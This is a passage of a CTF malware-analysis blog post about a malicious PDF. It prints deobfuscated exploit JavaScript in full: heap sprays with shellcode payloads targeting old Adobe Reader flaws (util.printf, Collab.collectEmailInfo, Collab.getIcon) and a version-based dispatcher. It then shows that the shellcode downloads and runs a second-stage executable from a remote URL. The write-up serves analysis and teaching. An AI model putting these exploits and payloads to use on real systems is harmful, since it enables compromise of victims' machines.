class="string">&quot;%uabba%ua906%u29f1%ud9c9%ud9c9%u2474%ub1f4%u5d64%uc583%u3104%u0f55%u5503%ue20f%ued5e%uabb9%uc1ea%u2d70%u1953%u3282%u6897%ud01d%u872d%ufd18%ua73a%u02dc%u14cc%u64ba%u66b5%uae41%uf16c%u5623%udb7c%u7bc1%u5e69%u69dd%uf0b0%ucf0c%u1950%udd95%u5ab9%u7b37%u772b%uc55f%u1531%ue18d%u70c8%uc2c5%u4c1c%u7b34%u2f3a%ue82b%u27c9%u848b%ua512%u999d%u2faa%u84c0%u2bee%u768c%u0bc8%u237e%u4cc6%u51c2%u3abc%ufc45%u1118%uffe5%uf48a%udf14%u6c2f%u8742%u0a57%u6fe9%ub5b5%uca94%ua6ab%u84ba%u77d1%u4a2c%u74ac%uabcf%ub25f%ub269%u5e06%u51d5%u90f3%u978f%uec66%u6942%u6a9b%u18a2%u12ff%u42ba%u7be5%ubb37%u9dc6%u5de0%ufe14%uf2f7%uc6fd%u7812%uda44%u7167%u110f%ubb01%uf81a%ud953%ufc21%u22db%u20f7%u46b9%u27e6%ue127%u8e42%udb91%ufe58%ubaeb%u6492%u07fe%uade3%u4998%uf89a%u9803%u5131%u1192%ufcd5%u3ac9%u352d%u71de%u81cb%u4522%u6d21%uecd2%ucb1c%u4e6d%u8df8%u6eeb%ubff8%u653d%ubaf6%u8766%ud10b%u926b%ubf19%u9f4a%u0a30%u8a92%u7727%u96a7%u6347%ud3b4%u824a%uc4ae%uf24c%uf5ff%ud99b%u0ae1%u7b99%u133d%u91ad%u2573%u96a6%u3b74%ub2a1%u3c73%ue92c%u468c%uea25%u5986%u9261%u71b5%u5164%u71b3%u561f%uabf7%u91c2%ua3e6%uab09%ub60f%ua23c%ub92f%ub74b%ua308%u3cdb%ua4dd%u9221%u2732%u8339%u892b%u34a9%ub0da%ua550%u4f47%u568c%uc8fa%uc5fe%u3983%u7a98%u2306%uf60a%uc88f%u9b8d%u6e27%u305d%u1edd%uadfa%ub232%u4265%u2d3a%uff17%u83f5%u87b2%u5b90&quot;</span>);</span><br><span class="line">    nopsled = <span class="built_in">unescape</span>(<span class="string">&quot;%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (nopsled.<span class="property">length</span> &lt; chunk_size) &#123;</span><br><span class="line">        nopsled += nopsled;</span><br><span class="line">    &#125;</span><br><span class="line">    nopsled_len = chunk_size  -  (payload.<span class="property">length</span>  +  <span class="number">20</span>);</span><br><span class="line">    nopsled = nopsled.<span class="title function_">substring</span>(<span class="number">0</span>, nopsled_len);</span><br><span class="line">    heap_chunks = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">2500</span>; i++) &#123;</span><br><span class="line">        heap_chunks[i] = nopsled  +  payload;</span><br><span class="line">    &#125;</span><br><span class="line">    util.<span class="title function_">printd</span>(<span class="string">&quot;1.000000000.000000000.1337 : 3.13.37&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        media.<span class="title function_">newPlayer</span>(<span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    util.<span class="title function_">printd</span>(<span class="string">&quot;1.000000000.000000000.1337 : 3.13.37&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">first_exploit</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// freecell.exe payload</span></span><br><span class="line">    <span class="keyword">var</span> payload = <span class="built_in">unescape</span>(<span class="string">&quot;%uc929%u65b1%ud7db%u74d9%uf424%u83b8%u3830%u5b84%u4331%u0313%u1343%u6883%udacc%u8571%u413d%u6a30%u13f7%ub07d%u5c06%uc249%ube91%u3948%ud6a4%u4246%ud958%uf0e9%ubf3e%ucb93%uf8bc%u520a%u60a7%ubd5e%u804d%ub8b6%ub75a%u5391%uf6b0%ub933%uea10%ubade%u91ba%ud64b%u1fdb%ub411%ub731%u92ab%uf842%u2a7a%ua0b8%uc819%uc7af%u9bee%u7d10%u4e2e%u4201%u8a96%ude7c%ud1cb%u20f0%ue235%uf4e3%u33a8%u6fbe%u8396%u15b9%ub97f%ud56a%u2c92%uf698%ud416%u50c7%u7361%u386d%u1a83%ue308%u7fb1%u7a3f%u20ac%u90a8%u2d99%u544b%u1868%ucced%u8012%u7b51%u7bef%u4d0b%u4095%u10c6%udea5%ue327%u47ed%u9d3e%u28f4%u51cb%ucfd7%u746c%u8c04%u286b%u95cd%u4396%u0b57%u58e2%ue11e%u508a%uab14%uf7cf%uab12%ufb47%u96c3%u9932%ud41d%u3bda%u7d77%uf214%ub242%u636f%u299d%u2962%u7be8%u7fe4%ub283%ub18f%uee39%u7b09%ub7de%ue345%u8c16%u2e59%u59c0%u6fa5%u263f%uda5e%u8219%ua5d1%u54fc%u0474%u75fc%u53b1%u7f0b%u599a%u9409%u48e7%uf318%u71c6%uc930%u6317%u3126%ua923%u2249%ua830%u4247%uad22%u3340%ude7b%u9f86%ue365%u8693%ufdba%u5594%u0f8f%u59bf%u0de8%u74d9%u16ff%ua327%u1cf0%ub333%u021a%uda1c%u2831%u2868%u583f%u1c0a%u720b%u6af0%u8a62%u64fe%u8883%u7ecc%u83ab%u823a%ufd8c%u0ead%u8e59%uc117%u0c8e%u7204%ufeb6%ue3bc%u9a56%u9545%u10c3%u0698%ube7e%ub5ca%u6f07%u2a75%u0a8a%uc717%ub603%u44b8%u59bc%ue62b%uf459%u93d4%u658e%u377a%u14a6%ua20e%ue517%u49c0%u6cd0%u419d&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> nop = <span class="built_in">unescape</span>(<span class="string">&quot;%u0A0A%u0A0A%u0A0A%u0A0A&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> heapblock = nop  +  payload;</span><br><span class="line">    <span class="keyword">var</span> bigblock = <span class="built_in">unescape</span>(<span class="string">&quot;%u0A0A%u0A0A&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> headersize = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">var</span> spray = headersize  +  heapblock.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">while</span> (bigblock.<span class="property">length</span> &lt; spray)  &#123;</span><br><span class="line">        bigblock += bigblock;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> fillblock = bigblock.<span class="title function_">substring</span>(<span class="number">0</span>, spray);</span><br><span class="line">    <span class="keyword">var</span> block = bigblock.<span class="title function_">substring</span>(<span class="number">0</span>, bigblock.<span class="property">length</span>  -  spray);</span><br><span class="line">    <span class="keyword">while</span> (block.<span class="property">length</span>  +  spray &lt; <span class="number">0x40000</span>)  &#123;</span><br><span class="line">        block = block  +  block  +  fillblock;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> mem_array = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1400</span>; i++) &#123;</span><br><span class="line">        mem_array[i] = block  +  heapblock;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> num = <span class="number">12999999999999999999888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888</span>;</span><br><span class="line">    util.<span class="title function_">printf</span>(<span class="string">&quot;%45000f&quot;</span>, num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">second_exploit</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// notepad.exe payload</span></span><br><span class="line">    <span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>(<span class="string">&quot;%uc931%u64b1%ub6bf%u558b%ud976%ud9cd%u2474%u58f4%ue883%u31fc%u0d78%u7803%ue20d%u6043%u2c45%u44e1%ub6af%u964c%ub72e%ued9a%u55a9%u1a18%u71cc%u2237%u7e30%u91b7%u1856%ue9ae%u2394%u7479%ucdff%u5e6b%ufc95%ue562%u12a2%u77ad%u53d8%u925f%u4178%ue5b2%ufc62%uf826%ub883%u9e2c%u6c59%uf5dd%u5d2a%uc113%uc7c1%ub031%u6cf7%ua2b6%u1838%u2007%u1d29%ua0b1%u0314%uaee1%ufbd8%u96df%ua80b%uc7cd%uca91%ubfab%u7091%uea13%u7a32%u7bb1%u5ba0%ue130%u3b9f%u8d42%ue4ba%u28a0%u4e20%u29d6%u0147%uf2cc%ucff0%uffb9%u2f62%uc948%u2904%ud333%ude69%u2b88%u10f3%u776b%uedee%uef80%u9fcf%u89c2%uc649%uf510%u36e3%u10fb%ud153%u40ef%u4d82%u41f6%ue4ae%u5cb1%uf58a%uaa78%u3472%u750f%u52e6%u712a%u9faf%u5fea%uc24a%u9cf3%u64f2%u0559%u5ecc%u7957%u0607%ue3a9%u828a%u26fc%uc2cc%u7f97%u1577%u2a0a%u9c21%u73c8%ube3e%u4838%uf571%u04de%uca4d%ue02c%u6126%u4c09%ucab8%u16cf%ueb5c%u3af3%uf869%u3ffd%u02b2%u2bfc%u17bf%u3214%u149e%u8f05%u0fff%uec38%u0df4%ue632%u5709%u0f5f%u481a%u6947%u7913%u5680%u864d%ufe94%u9652%uec98%ua8a6%u13b3%ub6c0%u39da%ub1c7%u1421%ub9d8%u6f32%udef2%u091c%uf4e9%ude69%ufd04%ud308%ud722%u1af7%u2f5a%u15f2%u2d5b%u2f31%u3e43%u2c3c%u26a4%ub9d6%u2921%u6d1c%uabe5%u1e0c%u059e%u8fa4%u3f0e%u3e4d%ucbaa%ud183%u5346%u40f5%ub4de%uf46f%uae52%u7901%u53fa%u1e82%uf294%u8d50%u9b01%u28cf%u50e5%ud262%ue195%u661d%u2003%ufeb8%ubcae&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> mem_array = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">    <span class="keyword">var</span> cc = <span class="number">0x0c0c0c0c</span>;</span><br><span class="line">    <span class="keyword">var</span> addr = <span class="number">0x400000</span>;</span><br><span class="line">    <span class="keyword">var</span> sc_len = shellcode.<span class="property">length</span>  *  <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">var</span> len = addr  -  (sc_len  +  <span class="number">0x38</span>);</span><br><span class="line">    <span class="keyword">var</span> yarsp = <span class="built_in">unescape</span>(<span class="string">&quot;%u9090%u9090&quot;</span>);</span><br><span class="line">    yarsp = <span class="title function_">s</span>(yarsp, len);</span><br><span class="line">    <span class="keyword">var</span> count2 = (cc  -  <span class="number">0x400000</span>)  /  addr;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> count = <span class="number">0</span>; count &lt; count2; count++) &#123;</span><br><span class="line">        mem_array[count] = yarsp  +  shellcode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> overflow = <span class="built_in">unescape</span>(<span class="string">&quot;%u0c0c%u0c0c&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (overflow.<span class="property">length</span> &lt; <span class="number">44952</span>) &#123;</span><br><span class="line">        overflow += overflow;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">collabStore</span> = <span class="title class_">Collab</span>.<span class="title function_">collectEmailInfo</span>(&#123;</span><br><span class="line">        <span class="attr">subj</span>: <span class="string">&quot;&quot;</span>, <span class="attr">msg</span>: overflow</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">third_exploit</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (app.<span class="property">doc</span>.<span class="property">Collab</span>.<span class="property">getIcon</span>)  &#123;</span><br><span class="line">        <span class="keyword">var</span> arry = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">        <span class="comment">// cmd.exe payload</span></span><br><span class="line">        <span class="keyword">var</span> payload = <span class="built_in">unescape</span>(<span class="string">&quot;%ud3b8%u7458%ud901%u2bcb%ud9c9%u2474%ub1f4%u5a65%u4231%u0312%u1242%u3983%u96a4%u56f4%u0d45%u9bbd%ud7af%ue7f8%u982e%u1dcf%u7aa8%ucad5%u92cf%uf3c1%u9d2f%u4766%ufb49%u941e%uc494%u8389%uacfe%u6ad8%udd95%u0935%uf3a2%u801c%ub2d9%u488c%u2678%u0b5c%udd62%u01f4%u5b82%u4792%u4b5e%u2d2e%ubc2a%uf9ff%ue4c1%u9b9a%u83f7%ucc69%u3938%u1fb1%u7e29%uc50b%ue214%u8248%udcd8%ub3b7%u890b%ue425%uab91%u5210%u5192%uc8fc%u9932%u9def%ubaa1%u0795%u1c9f%uacee%uc5ba%u4b1c%uaf20%u0832%u3e47%u9129%uacf0%ude04%u1062%ue9e7%u0804%uf391%ubf69%ucc69%u71f0%u1108%uccee%u0d20%ubecf%ub462%ud949%u9971%u15e3%u3c5a%ub053%u5d89%u6c82%u6648%u07ae%u7ad2%u148a%ub09d%u1572%u1aab%u33e6%u5a91%ub8af%u4744%udd4a%u8b98%u47f2%u2af0%ub1cc%u03cf%u2707%ufe1e%ued8a%uca57%u23cd%u030e%u7277%u39bc%ubf21%u6423%udf3e%u5d93%uea71%u2a42%u2b4d%ud7b8%u0626%u7de4%ue9b8%ue771%uc85c%u0a82%u1f69%u2e8c%u1db2%u258c%u34bf%u2085%u359e%u98b7%u2cff%ue0a5%u6cf4%uf3c6%u7409%uf5ca%u6919%u60cd%u9a13%u4e19%ua74d%uf71c%ub952%uea11%ucba6%u0839%ud1c0%u2527%ud2c7%u10a5%ud8d8%u62bd%ufff2%u0b9a%uebe9%udfee%u1c04%ud389%u3622%u1d77%u4e5a%u177d%u4c5b%u21b3%u5f43%u31b9%u39a4%ubd2a%u4a21%u1291%uc8e5%u0389%u229e%ub43a%u5e0e%u24c3%ud4aa%ud71d%u7246%u4a4c%u53de%ufbf6%uc952%u7098%u72fa%u153a%u1594%ub5a8%ub801%u2057%u29e5%uc6f9%ud08e%u738b%u275f%u1e42%u22e7%u411a&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> len = <span class="number">0x400000</span>  -  (payload.<span class="property">length</span>  *  <span class="number">2</span>  +  <span class="number">0x38</span>);</span><br><span class="line">        <span class="keyword">var</span> yarsp = <span class="built_in">unescape</span>(<span class="string">&quot;%u9090%u9090&quot;</span>);</span><br><span class="line">        yarsp = <span class="title function_">s</span>(yarsp, len);</span><br><span class="line">        <span class="keyword">var</span> boundary = (<span class="number">0x0c0c0c0c</span>  -  <span class="number">0x400000</span>)  /  <span class="number">0x400000</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; boundary; i++) &#123;</span><br><span class="line">            arry[i] = yarsp  +  payload;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> str = <span class="built_in">unescape</span>(<span class="string">&quot;%09&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (str.<span class="property">length</span> &lt; <span class="number">0x4000</span>) &#123;</span><br><span class="line">            str += str;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        str = <span class="string">&quot;N.&quot;</span>  +  str;</span><br><span class="line">        app.<span class="property">doc</span>.<span class="property">Collab</span>.<span class="title function_">getIcon</span>(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">run_exploit_wrapper</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> version = app.<span class="property">viewerVersion</span>.<span class="title function_">toString</span>();</span><br><span class="line">    version = version.<span class="title function_">replace</span>(<span class="regexp">/D/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> version_array = <span class="keyword">new</span> <span class="title class_">Array</span>(version.<span class="title function_">charAt</span>(<span class="number">0</span>), version.<span class="title function_">charAt</span>(<span class="number">1</span>), version.<span class="title function_">charAt</span>(<span class="number">2</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((version_array[<span class="number">0</span>] == <span class="number">8</span>) &amp;&amp; (version_array[<span class="number">1</span>] == <span class="number">0</span>)  || (version_array[<span class="number">1</span>] == <span class="number">1</span> &amp;&amp;</span><br><span class="line">    version_array[<span class="number">2</span>] &lt; <span class="number">3</span>)) &#123; <span class="comment">// version == 8.0.[0-1-2] || version == 8.1.[0-1-2]</span></span><br><span class="line">        <span class="title function_">first_exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((version_array[<span class="number">0</span>] &lt; <span class="number">8</span>) || (version_array[<span class="number">0</span>] == <span class="number">8</span> &amp;&amp; version_array[<span class="number">1</span>] &lt; <span class="number">2</span> &amp;&amp; version_array[<span class="number">2</span>] &lt; <span class="number">2</span>)) &#123; <span class="comment">// version &lt; 8.x.x || version == 8.[0-1].[0-1]</span></span><br><span class="line">        <span class="title function_">second_exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((version_array[<span class="number">0</span>] &lt; <span class="number">9</span>) || (version_array[<span class="number">0</span>] == <span class="number">9</span> &amp;&amp; version_array[<span class="number">1</span>] &lt; <span class="number">1</span>)) &#123; <span class="comment">// version &lt; 9.x.x || version == 9.0.x</span></span><br><span class="line">        <span class="title function_">third_exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">common_exploit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">run_exploit_wrapper</span>();</span><br></pre></td></tr></table></figure>
<p>Now we can see that there are a lot of exploits functions that are executed when some PDF reader version match. </p>
<h2 id="Shellcode-Analysis"><a href="#Shellcode-Analysis" class="headerlink" title="Shellcode Analysis"></a>Shellcode Analysis</h2><p><em>TL;DR: in this post I will show you only the analysis of common_exploit shellcode otherwise the post would be too long and the analysis would be redoundant because I have applied the same methodology.</em><br>This step requires to convert the payload containing the shellcode to PE using the <a target="_blank" rel="noopener" href="http://sandsprite.com/sc2exe/shellcode_2_exe.php">shellcode2exe</a> utility, interesting fact: this utility works also with unicode escaped sequence, then I debugged the win exe using <code>x64dbg</code> setting up a bp to <code>LoadLibrary</code>, when hitted I saw that the shellcode tries to load the urlmon library used to interact with some webserver.<br><img src="/images/CTF_Write-Up/GetPDF/x64dbg1.png" alt="x64dbg1"><br>Stepping through the shellcode execution we can notice that the shellcode tries to use the urlmon’s function <code>UrlDownloadToFileA</code>, according to <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)">MSDN</a> it downloads a file from <code>http[:]//blog.honeynet.org.my/forensic_challenge/malware.4.exe</code> and saves into a file named  <code>a.exe</code> inside the <code>C:\Windows\System32</code> folder:<br><img src="/images/CTF_Write-Up/GetPDF/x64dbg2.png" alt="x64dbg2"><br>Unluckily the web server respondes with <code>404</code>, so we cannot analyze the second stager.</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>Cyberdefenders - GetPDF</p><p><a href="https://captwake.github.io/2022/02/17/2022-02-17-GetPDF/">https://captwake.github.io/2022/02/17/2022-02-17-GetPDF/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Stefano De Rosa</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-02-17</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2023-08-25</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="sharethis-inline-share-buttons"></div><script src="https://platform-api.sharethis.com/js/sharethis.js#property=64e4c5da4265f4001221c982&amp;product=inline-share-buttons&amp;source=platform" defer></script></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2023/08/24/2023-08-24-Function%20optimizations/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Gradient Descent explained</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2022/02/12/2022-02-12-PEB/"><span class="level-item">Understanding the Windows PEB</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config = function () {
            this.page.url = 'https://captwake.github.io/2022/02/17/2022-02-17-GetPDF/';
            this.page.identifier = '2022/02/17/2022-02-17-GetPDF/';
        };
        (function() {
            var d = document, s = d.createElement('script');  
            s.src = '//' + 'personal-blog-u9zciprq1a' + '.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://avatars.githubusercontent.com/CaptWake" alt="Stefano De Rosa"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Stefano De Rosa</p><p class="is-size-6 is-block">Cybersecurity, Machine Learning</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Italy</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">4</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/CaptWake" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/CaptWake"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/CaptWake"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:stefano.derosa@proton.me"><i class="fas fa-envelope-square"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#Introduction"><span class="level-left"><span class="level-item">1</span><span class="level-item">Introduction</span></span></a></li><li><a class="level is-mobile" href="#PCAP-Analysis"><span class="level-left"><span class="level-item">2</span><span class="level-item">PCAP Analysis</span></span></a></li><li><a class="level is-mobile" href="#PDF-Analysis"><span class="level-left"><span class="level-item">3</span><span class="level-item">PDF Analysis</span></span></a></li><li><a class="level is-mobile" href="#JS-deobfuscation"><span class="level-left"><span class="level-item">4</span><span class="level-item">JS deobfuscation</span></span></a></li><li><a class="level is-mobile" href="#Shellcode-Analysis"><span class="level-left"><span class="level-item">5</span><span class="level-item">Shellcode Analysis</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/CTF-Write-Up/"><span class="level-start"><span class="level-item">CTF Write-Up</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Machine-Learning/"><span class="level-start"><span class="level-item">Machine Learning</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Malware-Analysis/"><span class="level-start"><span class="level-item">Malware Analysis</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/Windows-Internals/"><span class="level-start"><span class="level-item">Windows Internals</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/images/favicons/favicon-16x16.png" alt="Personal Blog" height="28"></a><p class="is-size-7"><span>&copy; 2023 Stefano De Rosa</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.9/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>